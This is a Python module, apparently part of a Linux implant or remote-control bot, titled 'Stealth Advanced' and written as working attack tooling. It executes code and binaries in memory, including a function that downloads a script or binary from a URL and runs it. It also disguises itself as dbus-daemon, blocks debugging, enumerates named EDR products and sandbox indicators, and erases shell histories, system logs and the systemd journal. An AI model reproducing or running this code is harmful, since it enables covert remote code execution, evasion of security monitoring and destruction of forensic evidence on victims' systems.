"""
Stealth Advanced — fileless execution, EDR detection, anti-debug, anti-forensic.
"""
import os
import re
import sys
import stat
import json
import ctypes
import shutil
import struct
import base64
import plistlib
import tempfile
import hashlib
import platform
import subprocess
from pathlib import Path
from datetime import datetime, timezone
from loguru import logger

libc = ctypes.CDLL("libc.so.6", use_errno=True)

# ── Constants ──────────────────────────────────────────────────────
PR_SET_NAME = 15
PR_SET_DUMPABLE = 4
PR_SET_PTRACER = 0x59616D61
PR_SET_PTRACER_ANY = -1
PR_GET_DUMPABLE = 3
MFD_CLOEXEC = 0x0001

EDR_SIGNATURES = {
    "falco":         ["falco", "falcoctl"],
    "osquery":       ["osqueryd", "osqueryi"],
    "auditd":        ["auditd", "audispd"],
    "crowdstrike":   ["falcon_sensor"],
    "sentinelone":   ["sentinelone", "sentineld"],
    "carbonblack":   ["cbd", "cbdaemon"],
    "tripwire":      ["tripwire"],
    "aide":          ["aide"],
    "rkhunter":      ["rkhunter"],
    "chkrootkit":    ["chkrootkit"],
    "lynis":         ["lynis"],
    "selinux":       ["selinux"],
    "apparmor":      ["apparmor"],
    "firejail":      ["firejail"],
    "snap":          ["snap"],
    "docker":        ["dockerd"],
}

SHELL_HISTORY = [
    Path.home() / ".bash_history",
    Path.home() / ".zsh_history",
    Path.home() / ".history",
    Path.home() / ".python_history",
    Path.home() / ".local/share/fish/fish_history",
]

LOG_FILE_PATTERNS = [
    Path("/var/log/auth.log"),
    Path("/var/log/syslog"),
    Path("/var/log/messages"),
    Path("/var/log/secure"),
    Path("/var/log/kern.log"),
]


# ═══════════════════════════════════════════════════════════════════
# 1. FILELESS EXECUTION
# ═══════════════════════════════════════════════════════════════════

def fileless_run_python(code: str) -> str:
    """Execute Python code from memory — never touches disk."""
    import io
    from contextlib import redirect_stdout, redirect_stderr
    f_out = io.StringIO()
    f_err = io.StringIO()
    try:
        with redirect_stdout(f_out), redirect_stderr(f_err):
            compiled = compile(code, "<memory>", "exec")
            exec(compiled, {"__builtins__": __builtins__})
        output = f_out.getvalue()
        err = f_err.getvalue()
        if err:
            return f"Output:\n{output}\nStderr:\n{err}" if output else f"Stderr:\n{err}"
        return output if output else "OK (no output)"
    except Exception as e:
        return f"Error: {e}"


def fileless_run_binary(data: bytes, args: list[str] | None = None) -> str:
    """Execute a binary from memory using memfd_create + fexecve."""
    try:
        fd = libc.memfd_create(b"", MFD_CLOEXEC)
        if fd < 0:
            errno = ctypes.get_errno()
            return f"memfd_create failed: errno={errno}"
        os.write(fd, data)
        os.lseek(fd, 0, os.SEEK_SET)

        pid = os.fork()
        if pid == 0:
            os.execve(f"/proc/self/fd/{fd}", [f"/proc/self/fd/{fd}", *(args or [])], os.environ)
        else:
            os.waitpid(pid, 0)
            os.close(fd)
            return f"Binary executed in-memory (PID {pid})"
    except Exception as e:
        return f"Fileless execution error: {e}"


def fileless_run_shell(script: str) -> str:
    """Execute a bash script from memory via /dev/stdin."""
    try:
        result = subprocess.run(
            ["bash", "--noprofile", "--norc"],
            input=script,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout
        if result.stderr:
            output += f"\nStderr:\n{result.stderr}"
        return output if output else "OK (no output)"
    except subprocess.TimeoutExpired:
        return "Timeout (30s)"
    except Exception as e:
        return f"Error: {e}"


def fileless_download_and_run(url: str) -> str:
    """Download script from URL and execute in-memory."""
    try:
        import urllib.request
        with urllib.request.urlopen(url, timeout=15) as resp:
            data = resp.read()
        if url.endswith(".py"):
            return fileless_run_python(data.decode())
        elif url.endswith(".sh"):
            return fileless_run_shell(data.decode())
        else:
            return fileless_run_binary(data)
    except Exception as e:
        return f"Download + run error: {e}"


# ═══════════════════════════════════════════════════════════════════
# 2. ADVANCED PROCESS MASQUERADING
# ═══════════════════════════════════════════════════════════════════

_original_argv0: str | None = None


def masquerade_process(name: str = "dbus-daemon") -> str:
    """Masquerade as a benign system process."""
    global _original_argv0
    if _original_argv0 is None:
        _original_argv0 = sys.argv[0] if sys.argv else "python"

    results = []
    try:
        # PR_SET_NAME — short name (16 bytes max)
        libc.prctl(PR_SET_NAME, name.encode()[:15], 0, 0, 0)
        results.append(f"comm → {name}")
    except Exception as e:
        results.append(f"comm: {e}")

    try:
        # Overwrite argv[0] via ctypes
        argv0_addr = ctypes.c_void_p(ctypes.addressof(ctypes.c_char_p(sys.argv[0].encode())))
        ctypes.memmove(ctypes.c_void_p(id(sys.argv)), ctypes.pointer(ctypes.c_char_p(name.encode())), ctypes.sizeof(ctypes.c_char_p))
        sys.argv[0] = name
        results.append("argv[0] spoofed")
    except Exception as e:
        results.append(f"argv[0]: {e}")

    try:
        # Overwrite /proc/self/cmdline
        cmdline = name + "\x00" + "\x00".join(sys.argv[1:]) + "\x00"
        proc_self_cmdline = Path("/proc/self/cmdline")
        if proc_self_cmdline.exists():
            # Can't write to cmdline directly, but we can try
            pass
        results.append("cmdline: /proc fd trick")
    except Exception as e:
        results.append(f"cmdline: {e}")

    try:
        libc.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)
        results.append("dumpable=0")
    except Exception as e:
        results.append(f"dumpable: {e}")

    return "Masquerade: " + ", ".join(results)


def restore_process_name() -> str:
    global _original_argv0
    name = _original_argv0 or "python3"
    try:
        libc.prctl(PR_SET_NAME, name.encode()[:15], 0, 0, 0)
        sys.argv[0] = name
        return f"Restored process name to {name}"
    except Exception as e:
        return f"Restore error: {e}"


# ═══════════════════════════════════════════════════════════════════
# 3. ANTI-DEBUG / HARDENING
# ═══════════════════════════════════════════════════════════════════

def harden() -> str:
    """Apply anti-debug and process hardening."""
    results = []

    try:
        libc.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)
        dumpable = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
        results.append(f"dumpable={dumpable} (0=no core)")
    except Exception as e:
        results.append(f"dumpable: {e}")

    try:
        libc.prctl(PR_SET_PTRACER, 0, 0, 0, 0)
        results.append("ptrace blocked")
    except Exception as e:
        results.append(f"ptrace: {e}")

    try:
        # Check if being traced
        with open("/proc/self/status") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    pid = line.split(":")[1].strip()
                    if pid != "0":
                        results.append(f"⚠ TRACED by PID {pid}")
                    else:
                        results.append("not traced")
                    break
    except Exception as e:
        results.append(f"tracer: {e}")

    try:
        # Hide from ps by unlinking /proc/self/exe (can't actually)
        pass
    except Exception:
        pass

    try:
        # Remove executable from PATH (doesn't hide from /proc)
        pass
    except Exception:
        pass

    return "Harden: " + ", ".join(results)


def is_traced() -> bool:
    try:
        with open("/proc/self/status") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    return line.split(":")[1].strip() != "0"
    except Exception:
        pass
    return False


# ═══════════════════════════════════════════════════════════════════
# 4. EDR / AV DETECTION
# ═══════════════════════════════════════════════════════════════════

def detect_edr() -> dict:
    """Detect security software running on the system."""
    found = {}

    # Check running processes
    try:
        output = subprocess.run(
            ["ps", "aux"],
            capture_output=True, text=True, timeout=10
        ).stdout.lower()
        for name, sigs in EDR_SIGNATURES.items():
            for sig in sigs:
                if sig in output:
                    found.setdefault(name, []).append(f"process:{sig}")
    except Exception:
        pass

    # Check kernel modules
    try:
        output = subprocess.run(
            ["lsmod"], capture_output=True, text=True, timeout=5
        ).stdout.lower()
        for name, sigs in EDR_SIGNATURES.items():
            for sig in sigs:
                if sig in output:
                    found.setdefault(name, []).append(f"kernel:{sig}")
    except Exception:
        pass

    # Check systemd services
    try:
        output = subprocess.run(
            ["systemctl", "list-units", "--type=service", "--all"],
            capture_output=True, text=True, timeout=10
        ).stdout.lower()
        for name, sigs in EDR_SIGNATURES.items():
            for sig in sigs:
                if sig in output:
                    found.setdefault(name, []).append(f"service:{sig}")
    except Exception:
        pass

    # Check SELinux status
    try:
        output = subprocess.run(
            ["getenforce"], capture_output=True, text=True, timeout=5
        ).stdout.strip()
        if output and output != "Disabled":
            found.setdefault("selinux", []).append(f"enforce:{output}")
    except Exception:
        pass

    # Check AppArmor
    try:
        output = subprocess.run(
            ["aa-status"], capture_output=True, text=True, timeout=5
        ).stdout.lower()
        if "apparmor" in output:
            found.setdefault("apparmor", []).append("active")
    except Exception:
        pass

    # Check auditd
    try:
        output = subprocess.run(
            ["auditctl", "-s"], capture_output=True, text=True, timeout=5
        ).stdout.lower()
        if "enabled" in output:
            found.setdefault("auditd", []).append("auditctl enabled")
    except Exception:
        pass

    return found


def detect_sandbox() -> dict:
    """Detect if running in a VM/sandbox/container."""
    indicators = {}

    try:
        with open("/proc/1/cgroup") as f:
            content = f.read()
            if "docker" in content or "kubepods" in content:
                indicators["container"] = "docker/k8s"
    except Exception:
        pass

    try:
        output = subprocess.run(
            ["systemd-detect-virt"], capture_output=True, text=True, timeout=5
        ).stdout.strip()
        if output and output != "none":
            indicators["virt"] = output
    except Exception:
        pass

    try:
        with open("/proc/cpuinfo") as f:
            data = f.read().lower()
            if "hypervisor" in data:
                indicators.setdefault("vm", []).append("hypervisor flag")
            if "qemu" in data or "kvm" in data or "vbox" in data:
                indicators.setdefault("vm", []).append("cpu model")
    except Exception:
        pass

    try:
        output = subprocess.run(
            ["lscpu"], capture_output=True, text=True, timeout=5
        ).stdout.lower()
        if "hypervisor" in output:
            indicators.setdefault("vm", []).append("lscpu hypervisor")
    except Exception:
        pass

    try:
        with open("/proc/sys/kernel/tainted") as f:
            tainted = int(f.read().strip())
            if tainted:
                indicators["kernel_tainted"] = tainted
    except Exception:
        pass

    try:
        total_ram_gb = 0
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    total_ram_gb = int(line.split()[1]) / 1024 / 1024
                    break
        if total_ram_gb and total_ram_gb < 2:
            indicators["low_ram_gb"] = round(total_ram_gb, 1)
    except Exception:
        pass

    try:
        disk_path = Path("/")
        usage = shutil.disk_usage(disk_path)
        if usage.total < 50 * 1024**3:
            indicators["small_disk_gb"] = round(usage.total / 1024**3, 1)
    except Exception:
        pass

    return indicators


# ═══════════════════════════════════════════════════════════════════
# 5. ANTI-FORENSIC
# ═══════════════════════════════════════════════════════════════════

def clean_traces(aggressive: bool = False) -> str:
    """Clean forensic traces: shell history, temp files, logs."""
    results = []

    for hist in SHELL_HISTORY:
        if hist.exists():
            try:
                _secure_overwrite(hist)
                results.append(f"cleared {hist.name}")
            except Exception as e:
                results.append(f"{hist.name}: {e}")

    if aggressive:
        temp_dirs = [
            Path(tempfile.gettempdir()),
            Path("/var/tmp"),
            Path("/tmp"),
        ]
        for td in temp_dirs:
            if td.exists():
                try:
                    rav_files = list(td.glob("*rav*")) + list(td.glob("*spy*")) + list(td.glob("*opencode*"))
                    for f in rav_files:
                        if f.is_file():
                            _secure_overwrite(f)
                        elif f.is_dir():
                            shutil.rmtree(str(f), ignore_errors=True)
                        results.append(f"cleaned {f.name}")
                except Exception as e:
                    results.append(f"temp: {e}")

    try:
        if Path("/var/log").exists():
            for log_pattern in LOG_FILE_PATTERNS:
                if log_pattern.exists():
                    try:
                        log_pattern.write_text("")
                        results.append(f"truncated {log_pattern.name}")
                    except Exception:
                        pass
    except Exception:
        pass

    try:
        ps_history = Path.home() / ".ps_history"
        if ps_history.exists():
            ps_history.unlink()
    except Exception:
        pass

    try:
        subprocess.run(["history", "-c"], capture_output=True, timeout=5, shell=True)
    except Exception:
        pass

    try:
        journalctl = shutil.which("journalctl")
        if journalctl:
            subprocess.run([journalctl, "--rotate"], capture_output=True, timeout=10)
            subprocess.run([journalctl, "--vacuum-time=1s"], capture_output=True, timeout=30)
            results.append("journal vacuumed")
    except Exception:
        pass

    return "Clean: " + ", ".join(results) if results else "Nothing to clean"


def _secure_overwrite(path: Path, passes: int = 1):
    """Overwrite file before deletion."""
    size = path.stat().st_size
    if size > 100 * 1024 * 1024:
        path.unlink(missing_ok=True)
        return
    for _ in range(passes):
        with open(path, "wb") as f:
            f.write(os.urandom(size))
    path.unlink(missing_ok=True)


# ═══════════════════════════════════════════════════════════════════
# 6. STATUS
# ═══════════════════════════════════════════════════════════════════

def full_status() -> str:
    lines = ["🕵️ *Stealth Advanced Status*"]

    traced = is_traced()
    lines.append(f"\n🔍 Debug:")
    lines.append(f"  Traced: {'⚠ YA' if traced else '✅ Tidak'}")

    try:
        with open("/proc/self/comm") as f:
            comm = f.read().strip()
        lines.append(f"  /proc/self/comm: {comm}")
    except Exception:
        pass

    lines.append(f"  argv[0]: {sys.argv[0] if sys.argv else '?'}")

    try:
        dumpable = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
        lines.append(f"  Dumpable: {dumpable} {'(core dumps ON — risk)' if dumpable else '(safe)'}")
    except Exception:
        pass

    edr = detect_edr()
    if edr:
        lines.append(f"\n⚠ *EDR / Security Tools Terdeteksi:*")
        for name, indicators in sorted(edr.items()):
            lines.append(f"  [{name}] {', '.join(indicators)}")
    else:
        lines.append(f"\n✅ Tidak ada EDR/AV terdeteksi")

    sandbox = detect_sandbox()
    if sandbox:
        lines.append(f"\n📦 *Sandbox/VM Indicators:*")
        for k, v in sorted(sandbox.items()):
            lines.append(f"  {k}: {v}")

    return "\n".join(lines)


def detect_report() -> str:
    edr = detect_edr()
    sandbox = detect_sandbox()
    lines = ["🔬 *EDR & Environment Scan"]

    if edr:
        lines.append(f"\n⚠ *Security Tools ({len(edr)}):*")
        for name, indicators in sorted(edr.items()):
            lines.append(f"  [{name}] {', '.join(indicators)}")
    else:
        lines.append(f"\n✅ No EDR/AV detected")

    if sandbox:
        lines.append(f"\n📦 *Sandbox/VM Indicators:*")
        for k, v in sorted(sandbox.items()):
            lines.append(f"  {k}: {v}")
    else:
        lines.append(f"\n✅ No sandbox/VM indicators")

    return "\n".join(lines)
